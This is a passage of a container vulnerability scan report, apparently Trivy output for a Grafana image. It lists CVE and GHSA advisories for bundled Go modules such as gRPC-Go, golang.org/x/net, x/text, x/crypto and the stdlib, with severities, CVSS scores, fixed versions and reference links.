│                       │     │                   encryption key in plaintext through the /status/config
│                       │     │                   endpoint, potentially allowing unauthorized users to obtain
│                       │     │                   the key used to encrypt trace data stored in S3.
│                       │     │                   
│                       │     │                   Thanks to william_goodfellow for reporting this
│                       │     │                   vulnerability. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-326 
│                       │     ├ VendorSeverity   ╭ ghsa  : 3 
│                       │     │                  ╰ redhat: 2 
│                       │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/
│                       │     │                  │        │           A:N 
│                       │     │                  │        ╰ V3Score : 7.5 
│                       │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/
│                       │     │                           │           A:N 
│                       │     │                           ╰ V3Score : 6.5 
│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-28377 
│                       │     │                  ├ [1]: https://github.com/advisories/GHSA-ffqx-q65f-36jf 
│                       │     │                  ├ [2]: https://github.com/grafana/tempo 
│                       │     │                  ├ [3]: https://github.com/grafana/tempo/blob/4dc3e5b0d3463a0b6
│                       │     │                  │      7498b662b85a148698b4afd/CHANGELOG.md?plain=1#L135 
│                       │     │                  ├ [4]: https://github.com/grafana/tempo/commit/bb8ca663db34a09
│                       │     │                  │      80c9758b40d918fda3b4dbec3 
│                       │     │                  ├ [5]: https://grafana.com/security/security-advisories/cve-20
│                       │     │                  │      26-28377 
│                       │     │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-28377 
│                       │     │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-28377 
│                       │     ├ PublishedDate   : 2026-03-26T22:16:28.46Z 
│                       │     ╰ LastModifiedDate: 2026-06-17T13:20:14.76Z 
│                       ├ [5] ╭ VulnerabilityID : GO-2026-5932 
│                       │     ├ PkgID           : golang.org/x/crypto@v0.52.0 
│                       │     ├ PkgName         : golang.org/x/crypto 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.52.0 
│                       │     │                  ╰ UID : ed1a6850b8ba8c85 
│                       │     ├ InstalledVersion: v0.52.0 
│                       │     ├ Status          : affected 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:50510eb990d6ffd0c6b183c305059390dc028c5459ea839386424f
│                       │     │                   ac68783adb 
│                       │     ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained,
│                       │     │                   unsafe by design, and has known security issues 
│                       │     ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design,
│                       │     │                   has numerous known security issues, is not maintained, and
│                       │     │                   should not be used.
│                       │     │                   
│                       │     │                   If you are required to interoperate with OpenPGP systems and
│                       │     │                   need a maintained package, consider
│                       │     │                   github.com/ProtonMail/go-crypto/openpgp which is a maintained
│                       │     │                    fork that aims to be a drop-in replacement for this
│                       │     │                   package. 
│                       │     ├ Severity        : UNKNOWN 
│                       │     ╰ References       ╭ [0]: https://go.dev/issue/44226 
│                       │                        ╰ [1]: https://pkg.go.dev/vuln/GO-2026-5932 
│                       ├ [6] ╭ VulnerabilityID : CVE-2026-46600 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5942 
│                       │     ├ PkgID           : golang.org/x/net@v0.55.0 
│                       │     ├ PkgName         : golang.org/x/net 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.55.0 
│                       │     │                  ╰ UID : 3762bd4e34baa6ce 
│                       │     ├ InstalledVersion: v0.55.0 
│                       │     ├ FixedVersion    : 0.56.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:6cb5e662d75f748542b2285fbb05fa31ab42496bb8419d878fee3b
│                       │     │                   8c8e51ac31 
│                       │     ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size
│                       │     │                   of a param ... 
│                       │     ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
│                       │     │                   of a parameter value overflows the message buffer. 
│                       │     ├ Severity        : UNKNOWN 
│                       │     ├ CweIDs           ─ [0]: CWE-125 
│                       │     ├ References       ╭ [0]: https://go.dev/cl/786345 
│                       │     │                  ├ [1]: https://go.dev/issue/79795 
│                       │     │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
│                       │     ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
│                       │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│                       ├ [7] ╭ VulnerabilityID : CVE-2026-56852 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5970 
│                       │     ├ PkgID           : golang.org/x/text@v0.37.0 
│                       │     ├ PkgName         : golang.org/x/text 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.37.0 
│                       │     │                  ╰ UID : f5591d8a5f651e8f 
│                       │     ├ InstalledVersion: v0.37.0 
│                       │     ├ FixedVersion    : 0.39.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:f02b57220c81780dfa7d4b0d2776a2a94de411baaccc5d4655f46c
│                       │     │                   134c6d28c7 
│                       │     ├ Title           : A norm.Iter can enter an infinite loop when handling input
│                       │     │                   containing  ... 
│                       │     ├ Description     : A norm.Iter can enter an infinite loop when handling input
│                       │     │                   containing invalid UTF-8 bytes. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-835 
│                       │     ├ VendorSeverity   ─ azure: 3 
│                       │     ├ References       ╭ [0]: https://go.dev/cl/794100 
│                       │     │                  ├ [1]: https://go.dev/issue/80142 
│                       │     │                  ├ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-56852 
│                       │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-5970 
│                       │     ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
│                       │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│                       ╰ [8] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
│                             ├ PkgID           : google.golang.org/grpc@v1.81.1 
│                             ├ PkgName         : google.golang.org/grpc 
│                             ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.81.1 
│                             │                  ╰ UID : f8bbc19acb5c3986 
│                             ├ InstalledVersion: v1.81.1 
│                             ├ FixedVersion    : 1.82.1 
│                             ├ Status          : fixed 
│                             ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                             │                  │         92562dadc4ee6c7523d 
│                             │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                             │                            afbb07074e22b1af86c 
│                             ├ SeveritySource  : ghsa 
│                             ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
│                             ├ DataSource       ╭ ID  : ghsa 
│                             │                  ├ Name: GitHub Security Advisory Go 
│                             │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                             │                          osystem%3Ago 
│                             ├ Fingerprint     : sha256:d2ee31c30167fd89cfe232e38bde172a38b655dd8465a01dc9ffc0
│                             │                   4987101a0b 
│                             ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
│                             ├ Description     : Multiple security vulnerabilities have been identified and
│                             │                   addressed in grpc-go affecting the xDS RBAC authorization
│                             │                   engine (internal/xds/rbac) and the HTTP/2 transport server
│                             │                   implementation (internal/transport). These vulnerabilities
│                             │                   could result in:
│                             │                   
│                             │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC
│                             │                   policies containing `Metadata` or `RequestedServerName`
│                             │                   fields.
│                             │                   - Denial of Service (High CPU Consumption) due to an HTTP/2
│                             │                   Rapid Reset mitigation bypass during client-initiated stream
│                             │                   resets.
│                             │                   - Denial of Service (Server Panic) when parsing crafted xDS
│                             │                   RBAC policies containing `NOT` rules around unsupported
│                             │                   ### Impact
│                             │                   _What kind of vulnerability is it? Who is impacted?_
│                             │                   #### xDS RBAC Authorization Bypass via `Metadata` &
│                             │                   `RequestedServerName` matchers
│                             │                   - Affected Component: xDS RBAC 
│                             │                   - Impact: When building policy matchers for gRPC RBAC from
│                             │                   xDS configurations, unsupported `permission` and `principal`
│                             │                   rules (specifically `Metadata` and `RequestedServerName`)
│                             │                   were silently ignored and treated as no-ops.
│                             │                     - If an authorization policy relied purely on these
│                             │                   matchers for access control, treating those rules as no-ops
│                             │                   effectively removed the restrictions.
│                             │                   - If these unsupported rules were nested inside logical `NOT`
│                             │                    rules (`Permission_NotRule` / `Principal_NotId`) or
│                             │                   multi-condition `OR/AND` rules, silently dropping them
│                             │                   changed the boolean logic flow of the authorization engine.
│                             │                   As a result, policy evaluation decisions could fail open,
│                             │                   allowing unauthorized clients to access protected gRPC
│                             │                   services or resources.
│                             │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service
│                             │                    via Stream Aborts
│                             │                   - Affected Component: HTTP/2 transport
│                             │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid
│                             │                   Reset only applied threshold checks to items that directly
│                             │                   resulted in control frames being written back to the wire,
│                             │                   such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
│                             │                   When a client initiated a rapid flood of stream creation
│                             │                   (`HEADERS`) immediately followed by stream termination
│                             │                   `RST_STREAM`, items queued up in the control buffer without
│                             │                   counting against the transport response frame threshold. An
│                             │                   attacker can repeatedly trigger this flood sequence to bypass
│                             │                    reader blocking, resulting in high CPU usage, and Denial of
│                             │                   Service (DoS).
│                             │                   #### Denial of Service (Panic) in xDS RBAC Engine via
│                             │                   Unsupported Fields inside NOT Rules
│                             │                   - Impact: The xDS RBAC policy translators recursively
│                             │                   generate matchers for nested rules. When a `NOT` rule wrapped
│                             │                    an unsupported or unhandled field (such as
│                             │                   `SourcedMetadata`), the recursive step returned an empty
│                             │                   matcher. This could result in a runtime panic when the RBAC
│                             │                   engine attempts to authorize an incoming request.
│                             │                   An attacker or misconfigured/malicious xDS management server
│                             │                   delivering an LDS/RDS update containing a `NOT` rule around
│                             │                   an unhandled field causes the gRPC server process to crash
│                             │                   immediately (CWE-248 / Denial of Service).
│                             │                   ### Patches
│                             │                   _Has the problem been patched? What versions should users
│                             │                   upgrade to?_
│                             │                   All three issues have been fixed in `master` and will be
│                             │                   released in 1.82.1 shortly.
│                             │                   ### Workarounds
│                             │                   _Is there a way for users to fix or remediate the
│                             │                   vulnerability without upgrading?_
│                             │                   If upgrading grpc-go immediately is not possible, apply the
│                             │                   following workarounds based on your deployment architecture:
│                             │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that upstream
│                             │                    xDS management servers do not push RBAC policies containing
│                             │                   `Metadata`, `RequestedServerName`, or `NOT` rules wrapping
│                             │                   unsupported fields (such as `SourcedMetadata`) to grpc-go
│                             │                   servers.
│                             │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse
│                             │                   proxies or load balancers (such as Envoy) with strict HTTP/2
│                             │                   `max_concurrent_streams` limits and active rate limiting on
│                             │                   `RST_STREAM` frequency per connection.
│                             │                   ### Severity
│                             │                     | Vulnerability | Qualitative Severity | Approximate CVSS
│                             │                   v3.1 Score | Primary Impact |
│                             │                     | :--- | :--- | :--- | :--- |
│                             │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` |
│                             │                   Unauthorized Access / Fail-Open |
│                             │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` |
│                             │                   High CPU Consumption / Denial of Service |
│                             │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` |
│                             │                   Process Crash / Denial of Service | 
│                             ├ Severity        : HIGH 
│                             ├ VendorSeverity   ─ ghsa: 3 
│                             ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:
│                             │                         │            H/VA:H/SC:N/SI:N/SA:N 
│                             │                         ╰ V40Score : 8.8 
│                             ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
│                             │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f
│                             │                  │      72a142fe0fc89c19770b2935 
│                             │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
│                             │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
│                             │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GHS
│                             │                         A-hrxh-6v49-42gf 
│                             ├ PublishedDate   : 2026-07-21T22:03:55Z 
│                             ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
├ [7] ╭ Target         : usr/share/grafana/data/plugins-bundled/elasticsearch/gpx_grafana_elasticsearch_datasou
│     │                  rce_linux_amd64 
│     ├ Class          : lang-pkgs 
│     ├ Type           : gobinary 
│     ├ Packages        
│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : GO-2026-5932 
│                       │     ├ PkgID           : golang.org/x/crypto@v0.52.0 
│                       │     ├ PkgName         : golang.org/x/crypto 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.52.0 
│                       │     │                  ╰ UID : 17c17fd066ffbe84 
│                       │     ├ InstalledVersion: v0.52.0 
│                       │     ├ Status          : affected 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:e86fa818a59236faff292fbdad6a9b3871338cc43d726c2651a11a
│                       │     │                   038669f2dc 
│                       │     ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained,
│                       │     │                   unsafe by design, and has known security issues 
│                       │     ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design,
│                       │     │                   has numerous known security issues, is not maintained, and
│                       │     │                   should not be used.
│                       │     │                   
│                       │     │                   If you are required to interoperate with OpenPGP systems and
│                       │     │                   need a maintained package, consider
│                       │     │                   github.com/ProtonMail/go-crypto/openpgp which is a maintained
│                       │     │                    fork that aims to be a drop-in replacement for this
│                       │     │                   package. 
│                       │     ├ Severity        : UNKNOWN 
│                       │     ╰ References       ╭ [0]: https://go.dev/issue/44226 
│                       │                        ╰ [1]: https://pkg.go.dev/vuln/GO-2026-5932 
│                       ├ [1] ╭ VulnerabilityID : CVE-2026-46600 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5942 
│                       │     ├ PkgID           : golang.org/x/net@v0.55.0 
│                       │     ├ PkgName         : golang.org/x/net 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.55.0 
│                       │     │                  ╰ UID : 13c74f367f948f87 
│                       │     ├ InstalledVersion: v0.55.0 
│                       │     ├ FixedVersion    : 0.56.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:beac7861c0b986eea90802a3f8dc55c0a0bb7b7db2ec912cb6e2f4
│                       │     │                   20addcd335 
│                       │     ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size
│                       │     │                   of a param ... 
│                       │     ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
│                       │     │                   of a parameter value overflows the message buffer. 
│                       │     ├ Severity        : UNKNOWN 
│                       │     ├ CweIDs           ─ [0]: CWE-125 
│                       │     ├ References       ╭ [0]: https://go.dev/cl/786345 
│                       │     │                  ├ [1]: https://go.dev/issue/79795 
│                       │     │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
│                       │     ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
│                       │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│                       ├ [2] ╭ VulnerabilityID : CVE-2026-56852 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5970 
│                       │     ├ PkgID           : golang.org/x/text@v0.37.0 
│                       │     ├ PkgName         : golang.org/x/text 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.37.0 
│                       │     │                  ╰ UID : 69b4d80ba371f59a 
│                       │     ├ InstalledVersion: v0.37.0 
│                       │     ├ FixedVersion    : 0.39.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:09ba0080bb449ceb55fbdc9ef21fe928166bda6fc8060cbbcd7856
│                       │     │                   7102262b98 
│                       │     ├ Title           : A norm.Iter can enter an infinite loop when handling input
│                       │     │                   containing  ... 
│                       │     ├ Description     : A norm.Iter can enter an infinite loop when handling input
│                       │     │                   containing invalid UTF-8 bytes. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-835 
│                       │     ├ VendorSeverity   ─ azure: 3 
│                       │     ├ References       ╭ [0]: https://go.dev/cl/794100 
│                       │     │                  ├ [1]: https://go.dev/issue/80142 
│                       │     │                  ├ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-56852 
│                       │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-5970 
│                       │     ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
│                       │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│                       ├ [3] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
│                       │     ├ PkgID           : google.golang.org/grpc@v1.80.0 
│                       │     ├ PkgName         : google.golang.org/grpc 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.80.0 
│                       │     │                  ╰ UID : faaf35a9263bf76 
│                       │     ├ InstalledVersion: v1.80.0 
│                       │     ├ FixedVersion    : 1.82.1 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Fingerprint     : sha256:e59e277e77eaa9d65e582ca6d4fd836690aaf5b1e92e67491cd21f
│                       │     │                   f863afe57b 
│                       │     ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
│                       │     ├ Description     : Multiple security vulnerabilities have been identified and
│                       │     │                   addressed in grpc-go affecting the xDS RBAC authorization
│                       │     │                   engine (internal/xds/rbac) and the HTTP/2 transport server
│                       │     │                   implementation (internal/transport). These vulnerabilities
│                       │     │                   could result in:
│                       │     │                   
│                       │     │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC
│                       │     │                   policies containing `Metadata` or `RequestedServerName`
│                       │     │                   fields.
│                       │     │                   - Denial of Service (High CPU Consumption) due to an HTTP/2
│                       │     │                   Rapid Reset mitigation bypass during client-initiated stream
│                       │     │                   resets.
│                       │     │                   - Denial of Service (Server Panic) when parsing crafted xDS
│                       │     │                   RBAC policies containing `NOT` rules around unsupported
│                       │     │                   ### Impact
│                       │     │                   _What kind of vulnerability is it? Who is impacted?_
│                       │     │                   #### xDS RBAC Authorization Bypass via `Metadata` &
│                       │     │                   `RequestedServerName` matchers
│                       │     │                   - Affected Component: xDS RBAC 
│                       │     │                   - Impact: When building policy matchers for gRPC RBAC from
│                       │     │                   xDS configurations, unsupported `permission` and `principal`
│                       │     │                   rules (specifically `Metadata` and `RequestedServerName`)
│                       │     │                   were silently ignored and treated as no-ops.
│                       │     │                     - If an authorization policy relied purely on these
│                       │     │                   matchers for access control, treating those rules as no-ops
│                       │     │                   effectively removed the restrictions.
│                       │     │                   - If these unsupported rules were nested inside logical `NOT`
│                       │     │                    rules (`Permission_NotRule` / `Principal_NotId`) or
│                       │     │                   multi-condition `OR/AND` rules, silently dropping them
│                       │     │                   changed the boolean logic flow of the authorization engine.
│                       │     │                   As a result, policy evaluation decisions could fail open,
│                       │     │                   allowing unauthorized clients to access protected gRPC
│                       │     │                   services or resources.
│                       │     │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service
│                       │     │                    via Stream Aborts
│                       │     │                   - Affected Component: HTTP/2 transport
│                       │     │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid
│                       │     │                   Reset only applied threshold checks to items that directly
│                       │     │                   resulted in control frames being written back to the wire,
│                       │     │                   such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
│                       │     │                   When a client initiated a rapid flood of stream creation
│                       │     │                   (`HEADERS`) immediately followed by stream termination
│                       │     │                   `RST_STREAM`, items queued up in the control buffer without
│                       │     │                   counting against the transport response frame threshold. An
│                       │     │                   attacker can repeatedly trigger this flood sequence to bypass
│                       │     │                    reader blocking, resulting in high CPU usage, and Denial of
│                       │     │                   Service (DoS).
│                       │     │                   #### Denial of Service (Panic) in xDS RBAC Engine via
│                       │     │                   Unsupported Fields inside NOT Rules
│                       │     │                   - Impact: The xDS RBAC policy translators recursively
│                       │     │                   generate matchers for nested rules. When a `NOT` rule wrapped
│                       │     │                    an unsupported or unhandled field (such as
│                       │     │                   `SourcedMetadata`), the recursive step returned an empty
│                       │     │                   matcher. This could result in a runtime panic when the RBAC
│                       │     │                   engine attempts to authorize an incoming request.
│                       │     │                   An attacker or misconfigured/malicious xDS management server
│                       │     │                   delivering an LDS/RDS update containing a `NOT` rule around
│                       │     │                   an unhandled field causes the gRPC server process to crash
│                       │     │                   immediately (CWE-248 / Denial of Service).
│                       │     │                   ### Patches
│                       │     │                   _Has the problem been patched? What versions should users
│                       │     │                   upgrade to?_
│                       │     │                   All three issues have been fixed in `master` and will be
│                       │     │                   released in 1.82.1 shortly.
│                       │     │                   ### Workarounds
│                       │     │                   _Is there a way for users to fix or remediate the
│                       │     │                   vulnerability without upgrading?_
│                       │     │                   If upgrading grpc-go immediately is not possible, apply the
│                       │     │                   following workarounds based on your deployment architecture:
│                       │     │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that upstream
│                       │     │                    xDS management servers do not push RBAC policies containing
│                       │     │                   `Metadata`, `RequestedServerName`, or `NOT` rules wrapping
│                       │     │                   unsupported fields (such as `SourcedMetadata`) to grpc-go
│                       │     │                   servers.
│                       │     │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse
│                       │     │                   proxies or load balancers (such as Envoy) with strict HTTP/2
│                       │     │                   `max_concurrent_streams` limits and active rate limiting on
│                       │     │                   `RST_STREAM` frequency per connection.
│                       │     │                   ### Severity
│                       │     │                     | Vulnerability | Qualitative Severity | Approximate CVSS
│                       │     │                   v3.1 Score | Primary Impact |
│                       │     │                     | :--- | :--- | :--- | :--- |
│                       │     │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` |
│                       │     │                   Unauthorized Access / Fail-Open |
│                       │     │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` |
│                       │     │                   High CPU Consumption / Denial of Service |
│                       │     │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` |
│                       │     │                   Process Crash / Denial of Service | 
│                       │     ├ Severity        : HIGH 
│                       │     ├ VendorSeverity   ─ ghsa: 3 
│                       │     ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:
│                       │     │                         │            H/VA:H/SC:N/SI:N/SA:N 
│                       │     │                         ╰ V40Score : 8.8 
│                       │     ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
│                       │     │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f
│                       │     │                  │      72a142fe0fc89c19770b2935 
│                       │     │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
│                       │     │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
│                       │     │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GHS
│                       │     │                         A-hrxh-6v49-42gf 
│                       │     ├ PublishedDate   : 2026-07-21T22:03:55Z 
│                       │     ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
│                       ├ [4] ╭ VulnerabilityID : CVE-2026-27145 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5037 
│                       │     ├ PkgID           : stdlib@v1.26.3 
│                       │     ├ PkgName         : stdlib 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│                       │     │                  ╰ UID : f77aad5d3fa73e61 
│                       │     ├ InstalledVersion: v1.26.3 
│                       │     ├ FixedVersion    : 1.25.11, 1.26.4 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe
│                       │     │                  │         92562dadc4ee6c7523d 
│                       │     │                  ╰ DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9
│                       │     │                            afbb07074e22b1af86c 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27145 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:5dda26ce094e49e8eda3e654f153877d97764e38ad1a06a5c4d857
│                       │     │                   f0391e0750 
│                       │     ├ Title           : crypto/x509: golang: golang crypto/x509: Denial of Service
│                       │     │                   via excessive processing of DNS SAN entries 
│                       │     ├ Description     : (*x509.Certificate).VerifyHostname previously called
│                       │     │                   matchHostnames in a loop over all DNS Subject Alternative
│                       │     │                   Name (SAN) entries. This caused strings.Split(host, ".") to
│                       │     │                   execute repeatedly on the same input hostname. With a large
│                       │     │                   DNS SAN list, verification costs scaled quadratically based
│                       │     │                   on the number of SAN entries multiplied by the hostname's
│                       │     │                   label count. Because x509.Verify validates hostnames before
│                       │     │                   building the certificate chain, this overhead occurred even
│                       │     │                   for untrusted certificates. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-606 
│                       │     ├ VendorSeverity   ╭ alma       : 3 
│                       │     │                  ├ amazon     : 2 
│                       │     │                  ├ bitnami    : 2 
│                       │     │                  ├ oracle-oval: 3 
│                       │     │                  ├ redhat     : 3 
│                       │     │                  ╰ rocky      : 3 
│                       │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L
│                       │     │                  │         │           /A:H 
│                       │     │                  │         ╰ V3Score : 6.5 
